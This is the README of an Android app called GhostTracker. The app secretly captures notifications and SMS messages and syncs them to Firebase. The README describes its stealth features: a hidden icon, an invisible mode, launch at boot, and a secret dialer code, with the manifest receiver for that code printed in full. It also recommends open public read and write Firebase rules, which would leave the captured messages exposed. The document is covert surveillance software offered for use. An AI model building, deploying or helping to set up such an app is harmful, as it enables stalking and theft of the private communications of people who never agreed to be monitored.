
# GhostTracker App

GhostTracker is an Android app that monitors notifications and SMS messages in the background and syncs data to Firebase in real-time. It supports hiding the app icon and invisible modes for stealth monitoring.

---

## Features

- Capture notifications from all apps
- Push notification data to Firebase
- Start services on device boot
- Enable/disable app icon visibility
- Invisible mode to run app silently
- Easy access via secret code receiver

---

## Requirements

- Android SDK 21 (Lollipop) or higher
- Firebase project setup with Realtime Database or Firestore
- Internet permission for syncing data

---

## Setup and Installation

1. **Clone this repository**

```bash
git clone https://github.com/dinidumaleezha/ghosttracker.git
```

2. **Open in Android Studio**

- Open the project in Android Studio.
- Sync Gradle and build the project.

3. **Firebase Setup**

- Create a Firebase project at [https://console.firebase.google.com](https://console.firebase.google.com)
- Add a new Android app in Firebase console with your app package name:  
  `com.maleezha.ghosttracker`
- Download the `google-services.json` file and place it in your app module's `app/` folder.
- Enable Firebase Realtime Database or Firestore, depending on your implementation.
- Set Firebase database rules to allow writing (during development):

```json
{
  "rules": {
    ".read": true,
    ".write": true
  }
}
```

*Note: For production, secure your Firebase rules properly.*

4. **Permissions**

Make sure to grant the following permissions manually or at runtime:

- Notification Access (Settings > Apps & Notifications > Special App Access > Notification Access)
- Boot Completed permission (app requests on install automatically)
- Internet permission in `AndroidManifest.xml`

5. **Build and Run**

- Build the app on your device or emulator.
- Grant notification access permission when prompted.
- Start using the app; notifications will be logged and pushed to Firebase.

---

## How to Connect Your Firebase

- Replace the Firebase project configuration (`google-services.json`) with your own.
- Your app will automatically push notification data to your Firebase database under your project.
- Monitor data changes directly on Firebase Console.

---

## Launching the App When Icon is Hidden

If you have hidden the app icon for stealth mode, you can still open the app by using a secret code in your phone's dialer:

1. Open your phone’s dialer.
2. Dial the secret code: `*#*#1234#*#*`
3. The app will launch automatically via the secret code receiver.

This is made possible by the following receiver registered in the `AndroidManifest.xml`:

```xml
<receiver android:name=".receivers.SecretCodeReceiver"
          android:exported="true">
    <intent-filter>
        <action android:name="android.provider.Telephony.SECRET_CODE" />
        <data android:scheme="android_secret_code" android:host="1234" />
    </intent-filter>
</receiver>
```

You can customize the secret code by changing the `android:host` value.

---

## Important Notes

- This app requires Notification Access permission to read notifications.
- To hide the app icon, use the "Hide App Icon" feature.
- Use the secret code receiver to launch the app if the icon is hidden.
- Make sure your Firebase Realtime Database or Firestore is properly configured to store notifications.

---

## Contributing

Feel free to fork the repo and submit pull requests.  
Report issues via GitHub Issues.

---

## License

This project is licensed under the MIT License.

---

## Contact

Created by Dinidu Maleezha  
Email: maleezha1975@gmail.com
